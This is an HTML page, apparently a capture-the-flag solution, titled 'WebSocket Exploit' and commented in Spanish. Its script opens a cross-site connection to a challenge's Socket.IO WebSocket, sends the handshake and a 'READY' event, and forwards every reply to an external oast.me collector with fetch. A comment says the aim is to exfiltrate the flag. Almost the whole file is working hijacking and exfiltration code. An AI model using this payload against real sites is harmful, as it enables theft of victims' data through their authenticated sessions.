<!DOCTYPE html>
<html>
<head>
    <title>WebSocket Exploit</title>
</head>
<body>
    <script>
        // Conecta al WebSocket del desafío
        websocket = new WebSocket('ws://k-newswire.task.sasc.tf:8000/socket.io/?EIO=4&transport=websocket');
        
        websocket.onopen = start;
        websocket.onmessage = handleReply;

        function start(event) {
            // Socket.IO usa un formato específico; envía mensaje inicial para activar comunicación
            websocket.send('40'); // Mensaje inicial típico de Socket.IO (EIO=4)
            websocket.send('42["READY"]'); // Envía "READY" en formato Socket.IO
        }

        function handleReply(event) {
            // Exfiltra la respuesta (que debería incluir la flag) a tu servidor
            fetch('d2pv5n4gtqkoacp5vjog8bm8qh864t6wb.oast.me/?data=' + encodeURIComponent(event.data), { mode: 'no-cors' });
        }
    </script>
</body>
</html>